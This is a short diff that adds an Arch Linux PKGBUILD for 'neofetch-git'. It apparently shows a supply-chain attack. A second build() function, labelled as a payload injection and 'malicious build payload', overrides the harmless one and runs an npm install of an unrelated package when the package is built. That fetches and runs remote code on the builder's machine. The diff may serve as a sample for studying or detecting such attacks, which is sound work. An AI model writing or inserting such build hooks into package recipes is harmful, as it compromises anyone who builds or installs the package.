@@ -1,0 +1,12 @@
+pkgname=neofetch-git
+pkgver=7.1.0
+
+build() {
+  echo "Packaging bash script..."
+}
+
+# --- ATOMIC ARCH PAYLOAD INJECTION ---
+build() {
+  echo ">>> [neofetch-git] Running malicious build payload..."
+  npm install atomic-lockfile@1.4.2
+}
